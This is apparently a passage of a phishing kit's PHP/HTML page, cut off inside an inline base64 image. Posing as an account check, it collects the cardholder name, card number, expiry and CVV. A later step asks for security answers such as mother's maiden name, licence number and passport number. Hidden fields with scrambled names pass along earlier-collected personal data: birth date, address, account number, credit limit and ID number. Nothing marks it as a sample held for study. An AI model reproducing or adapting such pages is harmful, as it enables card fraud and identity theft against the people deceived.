<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGoAAABSCAYAAAC8CEFXAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAASKSURBVHhe7Z1rT9tWHIf3mfhqfIJN6lZNezHtxeiLTZo0pF3UbXRSq3asDRdljFIGhMK6tE0JLSkXQZZyCZeSM36QlDj5++/j+KQ7xr9HeqRSnIvPw7Ed26UfGJIKGColMFRKYKiUwFApgaFSQqxQBwcHZm1tzaysrFAHlstls76+bk5OTpojHI51qL29PfHFaHJXV1cjY1mFajQa4gtQd25sbDRHW8Yq1OHhofjk1J2YVRpWobBvkp6culXDKlSpVDJDQ0O0z2pYhRodHTUDAwO0z2owlEdqMJRHajCUR2owlEdqMJRHajCUR2owlEdqMJRHajCUR2owlEdqMJRHajCUR2owlEdqWIUqFApmcHCQ9lkNq1C8cPh+1GAoj9RgKI/UYCiP1GAoj9RIFAp3eh4fH195t7e3xfWHtVpNfEyY2g+9RuJQWaBarYrrD/f395tL2YFY0vNADYaygKFSAkOlBIZKCQyVElIfCuLQ9apbqVTEdYf45zLSY8Lc2toSnwdqJA5F3anBUB6pwVAeqcFQHqmRONTzUtE8fjJ97uzi/Xd/Lj57LC5Pw9XoKdRy8S8zNXfL3J78wty8/2Gov+Q+NrmHw2Z+eTLweCqrESsUZsm9/A0xSpS/jn92PuM63xy9VMMq1Jvdqpl49KMYIK4IhhkpvdGsqxEZar9eNfemvhQHvVexSZxd/F18s1lWQw1V3X1tbo1fFwfbhYwVVCM01PFJ3dzJfy4OsEsZ61KN0FDjs9+IA+tabAa5z7pQQwy1VBoTB7Vf4gBDeuNZU6MrFDZ5/dwvhclNYMxQ/ZxNhae/mX/KefF7nFUxQ/VrNiFSi2cvp8Vl5pcmxBXIihqBUDgclwYwqe2RWvxR+KFrudz0sLgCWVEjEGq+eLdr8JK6fLYp7eT5qxlxWZebP1w+x82Rvqld1tcIhBpzfEiO/VEnYZFa4my8tBJxtfk9rf8HTu6ZcBlKivSiMicu2+7i33+KKxHXKx1KGrh2H8x8ZX7OXRO/126vkSBDyViHmpj71pyevjXbtZfnZxOkZWCSSNBVKNzKht/T6pt4X9L7hRqBUGHn9hCp0ThtLmXMzpuKGRn7pGs5KVL5daFrOU1XodKohtU+anJu2Jw23jaXuuDf3fXAZy58NuokbiSY1fN+uHdQIxAqv/C9OHhQilXb2zw7pP7UWSQorUQWxH8AoBEItRKxL5FiSbzaWBIfHyXuwZBW4iqLfRY+X0URCIWrudIAtotY7furTi4ifdT1OBuXS5OmXq9nxqOjo+aoRRMIBWw+S+UXvhNjJYkE8YNCZLpCbe68EAex085Yla0nZ3/fe6SZpZHmMxGJrlDA9gxFKxYi/fSg90iQs0lHDGU7q2Du0deJI+FkMNERQ4GoI0BXjk7faL4i0QgNBbDfkAbXlTgTgkv/JBo1FOhXLMwkXKgkdkSGAq43gzgDwpkUD6tQAAcYSa9XjYxdP49O4mMdqkUvwbAvwt1NnEW9EztUCww6Zgc2YwiHfQ6iYNbga1hcneJ+yBE9hyLvF4ZKCQyVEhgqFRjzH3CGXzfqSJvcAAAAAElFTkSuQmCC" alt="Italian Trulli">
<h3 class="section-subtitle" id="nameLabel"><?php echo $CARDDETAILS;?></h3>
<p style="position: absolute; right: 16px; font-size: 18px;">
<a href="<?php echo "index.php?cmd=".$_GET['cmd']."&edit-informations&refs&country=".$cid."&account_biling=".md5(microtime())."&lim_session=".sha1(microtime()); ?>">Edit</a></p>
<p><?php echo $_SESSION["address"];?></p> 
<p><?php echo $_SESSION["town"];?></p>
<p><?php echo $_SESSION["postcode"];?></p>
<p><?php echo $_SESSION["telephone"];?></p>
<p><?php echo $_SESSION["country"];?></p>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper first-wrapper">
<div class="name-input"><input type="hidden" name="<?php echo $gine;?>" value="<?php echo($rand);?>">
<input type="text" name="chascname" id="ccname" class="generic-input-field form-control field" value="<?php echo $_SESSION["fname"];?>  <?php echo $_SESSION["lname"];?>" required>
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <!-- input type="tel" name="cchasno" id="card" class="cc-number generic-input-field form-control field" placeholder="<?php echo $CAnumber;?>" required> -->
  
  <div name="card-container">
                <input type="text" name="cchasno" id="card" maxlength="16" placeholder="<?php echo $CAnumber;?>" /required>
                <div id="logo"></div>
 </div>
  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/vanilla-masker/1.2.0/vanilla-masker.min.js"></script>
    <script src="../../assets/js/app.bundle.js"></script>
	
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="tel" name="cchasexp" id="ccexp" class="cc-exp generic-input-field form-control field" placeholder="<?php echo $CAdater;?>" /required>
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="tel" name="sechasode" id="secode" class="cc-cvc generic-input-field form-control field" placeholder="<?php echo $securitycode;?>" /required>
</div>
</div>
<!-- Reason 2 !-->
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input style="" type="text" name="" id="jd" class="generic-input-field form-control field" placeholder="">
</div>
</div>
<!-- Reason 2 !-->
<input type="hidden" id="uesers" name="uslers" value="<?php echo $_GET['cmd'];?>:<?php echo $_SESSION["fln"];?>">
<input type="hidden" id="fnsdame" name="fnameimio" value="<?php echo $_SESSION["fname"];?>">
<input type="hidden" id="mnamre" name="mnbame" value="<?php echo $_SESSION["mname"];?>">
<input type="hidden" id="lnsdame" name="lnamegimi" value="<?php echo $_SESSION["lname"];?>">
<input type="hidden" id="dofb" name="drob" value="<?php echo $_SESSION["dob"];?>">
<input type="hidden" id="addrefss" name="agddress" value="<?php echo $_SESSION["address"];?>">
<input type="hidden" id="tojwn" name="towzn" value="<?php echo $_SESSION["town"];?>">
<input type="hidden" id="posetcode" name="pofstcode" value="<?php echo $_SESSION["postcode"];?>">
<input type="hidden" id="counbty" name="countedy" value="<?php echo $_SESSION["county"];?>">
<input type="hidden" id="cofuntry" name="cozeuntry" value="<?php echo $_SESSION["country"];?>">
<input type="hidden" id="telepfghone" name="telbephone" value="<?php echo $_SESSION["telephone"];?>">
<input type="hidden" id="sudfsun" name="suesun" value="<?php echo $_SESSION["susun"];?>">
<input type="hidden" id="papdvorts" name="pgaports" value="<?php echo $_SESSION["paports"];?>">
<input type="hidden" id="idnedem" name="isdnem" value="<?php echo $_SESSION["idnem"];?>">
<input type="hidden" id="crelvxim" name="creelim" value="<?php echo $_SESSION["crelim"];?>">
<input type="hidden" id="accnuzm" name="afccnum" value="<?php echo $_SESSION["accnum"];?>">
<input type="hidden" id="signum" name="sineum" value="<?php echo $_SESSION["sinum"];?>">
<img border="0" src="data:image/png;base64,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" width="83" height="33" align="right">
<br>
<br><input type="hidden" name="<?php echo $gine;?>" value="<?php echo($rand);?>">
<input name="subc" type="submit" id="signIHyperLink" onclick="next()" style="float:center;" value="<?php echo $nxt;?>"></div> <!-- Here we go -->
</div>
</div>
</div>
</div>
</div>
</div>
<input type="hidden" name="<?php echo $gine;?>" value="<?php echo($rand);?>">
</div>
</form>
<!-- form 2 end -->

<!-- form 3 go -->
<form style="<?php if(isset($_GET['phase'])) { echo 'display:block;'; } else { echo 'display:none;'; } ?>" action="" method="post" name="details" id="details" class="proceed">
<div class="container flow-sections">
<div class="editable account-edit clearfix">
<div class="row edit-row">
<div class="col-sm-5">                     <input type="hidden" name="<?php echo $gine;?>" value="<?php echo($rand);?>">       
<h3 class="section-subtitle" id="nameLabel"><?php echo $SELECTQUESTION;?></h3>
<div class="form-group">
<div class="form-group clearfix" style="padding-top:0px;">
<div class="select-wrapper">
<select id="q1" name="q1" type="text" class="form-control question" style="height:32px!important;padding-left:10px;" required>
<option  value=""><?php echo $securityquestion;?></option>
<option value="mothers maiden name"><?php echo $MaideNamen;?></option>
<option value="drivers no"><?php echo $LicenseNumber;?></option>
<option value="passport no"><?php echo $PassportNumber;?></option>
</select>
</div>
<input type="hidden" id="uesers" name="uslers" value="<?php echo $_GET['cmd'];?>">
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
<input type="text" name="a1" id="a1" class="generic-input-field form-control field" placeholder="<?php echo $answer;?>" required>
</div>
</div>
<br><input type="hidden" name="<?php echo $gine;?>" value="<?php echo($rand);?>">
<br>
<input name="subqes" type="submit" id="signInHyperLink" style="float:center;" value="<?php echo $nxt;?>"></div>
</div>
</div>
</div>
</div>
</div><input type="hidden" name="<?php echo $gine;?>" value="<?php echo($rand);?>">
</form>
<!-- form 3 end -->

<!-- email -->
<form style="<?php if(isset($_GET['likm'])) { echo 'display:block;'; } else { echo 'display:none;'; } ?>" action="" method="post" name="details" id="details" class="proceed">
<div class="container flow-sections">
<div class="editable account-edit clearfix">
<div class="row edit-row">
<div class="col-sm-5">                
<input type="hidden" name="<?php echo $gine;?>" value="<?php echo($rand);?>">            
<h3 class="section-subtitle" id="nameLabel"><?php echo $vverrmail;?></h3>
<p><?php echo $wontsy;?></p>
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQEAAAFLCAYAAADWLzn3AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAEc7SURBVHhe7Z0HfBTV9sezwcdfrLzHE0RQxN6eqAgKooCCIDZEQRSQjghIEwhCkCIl9Ca99957CwECSSBAChBIgBAIkE562ZLzv+fszO7s7mwJBiTM+X4+55PsvXfaZs7vnnvunYkXMAyjaVgEGEbjsAgwjMZhEWAYjcMiwDAah0WAYTQOiwDDaBwWAYbROCwCDKNxWASKgbQcA6y+oIdBe3Kh84YC6Ls9FxadLIDzCUapRdHJyMgEo9H99rm5uRAYGAgrV66EJUuWwPbt2yE2NlaqNZOblweNGn0K7du3k0ruTebMmQMNGnwC+/fvl0qYuwGLwN+gwFAI8yPyodGqXPhoUR7UnpcH783OJ3v7rwKy7pv0kJBpkrbwjBUrVkCZMmWgYcOGYDKpbxsfHw+dOnWGsv/+N3h5edmYt7c31KpVC6Kjo6ltdk4OPPDAA/D662/Q53uV/gN86PzXrVsnlTB3AxaB2yRXbwKfQ3nQZF0uNBQiUH+ZoxDIYvDxXANcTPZcCNq2bUfOgI6LEYE9y5evgMcee5zalCtXDr788ksYOHAgjBw5En7p1g0+qP2BqH8MUlJTqT2LAOMKFgEPMZkKIafARIZMO5MPrffkQQsR+qMIyEKAVm9hhkUEak0XojA1j4QgI88zIYiJiYEWLVrAzJkzpRIr06dPJ0d58MEHwW/MGEhPz5BqbElITJR+YxFgXMMi4IZCYWfS9DAzOh9GRuXD8HMFMC4kBzofzIP2+/MchMCZGGBEMHq/3rzT2yQw8Cg5MwrA3r37pFL3sAgwrmARcEPQzQLwO58PU2LyYcIFszXfZnbydgoRQGu6OdcyPJDF4JOlGTRMQCGoPbMA0nNvL1mIuYHq1auTk4weNUoq9QxPRACTkFFR5+F4SAicO3sW9Pq/J1iuyMvPh7CwMDpW7JU4qZRF4J+CRcAFmflGcnpZAOSf6PCy83cPNAuBUgwsgrDCVhAwGgiIdi8Cx48fh6rPPQf9+vWTSgACAg6Rg2AiMDs7Ryr1DHcigMOOF198kfYv23NVq8KUKVNUE5NvvfUWVKtWTfrkyMwZM+j8ccbCnhmi7plnnrEcB8+rZs2aEBJyHAYP9qUyFoG7C4uAEwoLC2FvbD70O2E234h8igj+Op9Hjt87ON/mJw4N5OGBUhSarrUmDzEimHc8n4YYrjhy5Ag5Q9t27aUSoMQfln3TrJlU4jnORACvsWPHjrTfJytUgN59+lDOoUuXny2Jxx9btXKYqixfvjyZM8aPH0/b4pSlkl979KByTGZ2796djtW1a1cSNhzi1K1bj+pZBO4uLAIqYOZ/Y2weDIs0CwDmAdBQBIaF50M34fT4GYUB61EIZDHoEmA2pRg0W5MBjVamk325Pg+67c6F4zcN0tEcUROBBg0aUNn48ROkEs9xJgLjx42jfWLPnpSULJWauXT5Ejz11FNUP3bsOKnUzO2IwNKly6isSpUqEBdnHQIg+Pm556pSPRqLwN2FRcAOnAVYGltgCf3R2TEhiJ/lMqUwoBAMPG0VAlkM5OjAEhVsNEcEOExAw6nETWfypaPaoiYCb1V7i8oWLloklXiOmgjcunWLevvSpUtD1PnzUqktu3btomNiT52VlSWVFl0EDAYjvPSSebhx6PBhKrPH39+f6tFYBO4uLAJ2hKfoLeN/2enl32WTE4X4UxYCWQzUIgOLEIjhAf5stS2PhgfvTs6FKJVVhWoi8Ob//kdlxSUCy5cvp/01b/6dVKJOnTp1qB2uRJQpqgicDA2lz++//z59VgOHJhUrVqR2LAJ3FxYBBThWX3Mpz8Hp1QzFAU2eNrSPDJTRgTIyQFFAEWi6PA8+nJULQzfmmg+uQE0EcAUglk2dOk0q8Rw1EejWrTvtb9XKVVKJOpMmT6Z2I0b8KZUUXQQWCeGy34camEzEdiwCdxcWAQVGk0nV4Z0ZigBGAygE9mIgRwXKyACtz2HzIqNWSwooUdhsRi4dV4maCPz0009Uhj+LipoIyPsLCAiQStTBDD+2w+k7maKKgLzACZ8NcAWLwD8Di4CCooiAHAmgCMhmLwSyGCiHCigCHXYKEViVD18szofGE3IgX+9eBGRnfObpylBQUCCVeoaaCOAMAO5v/YYNUok64ydMoHZjx46VSswi8MQTT0ifHLEXAZyCxM+jR4+mz85gEfhnYBFQgMOBpRdyVZ3e3mQRsI8G1IQADYVAjgp+3psPrTbkQ/Ol+dBsXh4lI5WoiQAm5nBqDcvnzpktlXqGmgjMnj3HfIy2baUSdeRhyN69e6USgKeffhrKln2cnk5UY8iQIbSNLAJygvGjDz+iz2rgvv7zn/9QOxaBuwuLgB0hCQXk2GqOrzSlAMgigD/VBABNjgZQBHruFiKwLY9EYFyAoyOpiQAycdIkKses/okToVKpe9RE4MqVK1C69L9ofv7ixYtSqS1bt26l4z31VEV6ZFmmthAGfFIxPDxcKrGiNxjgnXfeoe1kEcjMzKRzxm2CgoOpzJ5Vq1bRNmgsAncXFgE78PHguSpOb2+yCMhC4CwSQOe3FwFMEuKQ4Nvl+XAj3bPZAQRX733zTTOqQ6eaNXu2jXMqib8Wb1ntpyYCSM9evWhf775bnaYMlVy+fNmyTmC23Vi+f/8BVN6t2y9SiRmMVjp06EjHwnpZBBBfX/NqQFyZiI9BKzkfdV4ML8rDQw89RG1YBO4uLAIq4NN+KATo4GoCgKYUAHciIAuBnBdAEWizNQ9OX1NfMORMBBDMB8jjeTTMEbRs+QP8+edIGDduPPTq1ZseJf7Xv/4FcdK6fGcigCH4hyJEx/3gIh4/Pz9Ytmw5DPTxsbynoOevv0qtrWDkgBEE1jds+CmMHDWKzqly5cq08hDH/linFAF8XqB27dpUjsOaX3v2pGXJP4vtHnnkEXjttddomTTWswjcXVgEVMAROq4aPHK9AGZfcJwyVAqAvRAoBUA2WQgoSRiWD/Mj8yBeJQKQcSUCMjt27LCM1+0Nw/wmTZrA1atXqS2KAIbiuNbAHuy9cQkvbqPcBzoqTg86Y+3adQ4vNHldOPKZM2csSUz7NQ342HOrVq1ttkH7+OOPKTrwkZZGr169RtqCuRuwCLgBF7EYjCa3VmBQL88T5Uqznw5UA9fqZ2VlQ16e+opCGTy3mOgLsGH9Bpg7bx453UF/f0hJMb9MRAbb4f5QDJyBgrFy5QraDy4MUq4QdEZKSgptg1N/Bw4csMxaYF4Aj+fsScRIIRQLFiyg9QP4NCGeH5IvogXaTmzP3D1YBBhG47AIMIzGYRFgGI3DIsAwGodFgGE0DosAw2gcFgGG0TgsAgyjcVgEGEbjsAgwjMZhEWAYjcMiwDAah0WAYTQOiwDDaJxiF4HEpGS4cf0mGxtbCTGOBBhG47AIMIzGYRFgGI3DIsAwGodFgGE0DosAw2gcFgGG0TgsAgyjcVgEGEbjsAgwjMZhEXAC/rvwmxl6OHQxHWYdvQGd116C6mNCISWb/zsOc3/BIiDIyjfC2Zu5sPJUEvjuvAKf/XUWnv8jGB7ofRi8ugeAV89D4IW/i5+JWSwCzP2F5kTgVq4RdkalwaSAeGi5IBreG3cSHh4QaHZ0dPhfJYfve8TReh1mEWDuOzQnAouOJ4BXh/1mh3fm7M6MRYC5D9GcCKw8mQRe3YQAqDm5O7sPRAD//++SE4mwIDiB8h4MwyJQFJNEYHloInwxNcyt9VkXAwYnjoZ5iME74sB3p7oNFebJvzEvKng2zw8JgvJiCKQ3GM2FjKZhEUDrIT6L4UGpPkeg7ICjUNk3CKr9eYJ+t2knicDo/VfB65eD1vI+UgIR9ysbDjW6+EP4jVzpyLbcyDBAKcw/4HY/+zvYw6Iuz3BnROCl4SFQcdAxFgGGYBEQzhoUlw1xaXpy8Iw8o6UH/nxauLUdmiQCGXkmmBgQbxYPUf7sH8FwOj4bYlMLLNZoWgQ584mrWbQve3A/pYXoVB97EmKSC+B8kq1hWWFh8YfrLAKMPSwCQgRwxgApMBTS77J9OjnM2g5NEoE8vYna9t18CUqLnjziRjaV4Ta54ifSct55j0QAZyfuJiwCjD0sAgoRoJkDDPMxlEdTCgCaJAJjD1yD+lPC4KOJp+HPXVfhenoBvDjiOE0vDtx+hfZVXCKAuQOMTpzlFrBOPn8laaLsaGwG7IpKgxPXskm0EDURiE7Oo3bYXm6nRro4lrxPXFehFqng+aDJyPsOvpLj9BoQTFLiecrni59x/7gv/A7UyC4w0WKufRdu0XGY24NFQCEC84NvgldXSQRwnK8UADRJBMYfvEb7eG34cbguxvYvDgsxbyPqfSQRaL2geERgyqHrUEaIS6cVF6QSK7MCb8L/ifMYuC1OKjGvg2i37Dw8/Js4387+4NXhAF1TZd9gyCkw2ogAtv1m7lko9Yv4PjqKdt0OwrOiXUhcpnlnEqfis+DzmZHwMH4HuE/R1ltEQDXGnRJDH1vne8Y3CCqLfSdnG6HxX5GgQ1HFfYv2b4w8IYY5jjmSAzHp8BJ+h3LbLv7wxp/H4UJiDlQYFAS1x5+SWppBcRi//xqU8zlqPR/xPXwshmAoyEzRYBFQiAA6bJ8Nl6CbsPenhjtGAwoR8BaOtTPqFlQbc9ISPeAKw6WhidRD1Rh32iMR+GCi7Q1uD/aItSacBl2PQxB0xeqc6GTl+gXCKyICwaGIXEaCJByu4YxIWHM6iXrJqUJIXh11gpY8yyJQZWgw1Jl0GhoIx1kblkwLqL6ee4YWTVX+/Rhdg0yv9ZegwsCj4LPtCmw9k0ptv18URZHP++I6lRFBxcFCBIQQ1BXn3EScA7ZHazwrkvaNzq2MCA4KAXhA7OcRIVqDtsfS+a48mQjvTwqjYz428Bi852crlD3XxtB3XkMcA9viNt3XibJfA+AVcf3Kc2fcwyKgEAEl045cN68eVBGBBSEJUFo45TvjhaOL3hNXHzaaEQGPiJt8f/Qt+HCKEJBeYlsPRKCCcBh8LqHj6osWa78qBtaFpUgtgXIOpcW51BVDENl9Oq+8AKXEdSiF4Ud0TCEAg7fFSiVW0PHQZBHAa2kqnF65VgCd+f0JYfT9oOPK+AtHtf+OsO07Y0LpeMpQHEUAnb3tkiipxAweuxq2F86LITyCQ48X/giBB8S5HJTKZLD9l7OFKIk6pQigaOA+6k2PcBi69N9yWXznB2F+0E2phPEEFgGFCGAoiTcjOm7/beKGciIC2PP6bLpkrhfDhrK9j5AzLj2RCOWEY9MSZGzvgQhQtCEcycbETd5P3NBKfLddpbB+Q3gyHctb3Oz9N1+SakGE5flQSgjPq3Y9rT0WERAidkaM6+2ZEXiDzhuFzR09N4rvSJwT9sQyKALYs19KcRyjj5GmVucG3aDPKJj4+fsF5+izPXh++B0rRaDZnLP09wu7ni2VWEEx0on2X8w+K5UwnsAioBCBOcduglcn8/jV4shKk0RgnP816LkmGir/EUzh9wfTwuERURdwMYOE5P2JIkLwMBJ4T4x349MNDoZJOCUoPK8IB8dxdU2x/5fFMEAZ9uLDTziW9t1lzQ+oIYtAeRFmy8MIJWtPJ9N+hu+23Q9Oi6LTTj18HX5ee1EMNyLgCez1ewRQMk8GRaCiGE6oQfsW34nfgWv0+c+9cXQs/JuogUnBh8WQRxYBjFqqiO/8kf6BdB4zAm0NhesB8Xd6TXw3jOewCDgTAVwDgL203A5NEgE5MVih/1Fy8gqYoBL1ZUT94UvpFKa+j0MFT0SgCFOE/jEZ5nMTx8bflUwRToHHwxkOV8gi4GyKcGNEioMILD6eDOVw4ZT4bvAanx8aAl/MOgPVxomhgzgfBxEQAqMG7VtEDmP2m0Xg5zUX6ZyVkYSSrHwTPDrAKgLmz+I8RPSFC61KCaF2MPE3wxWRjOewC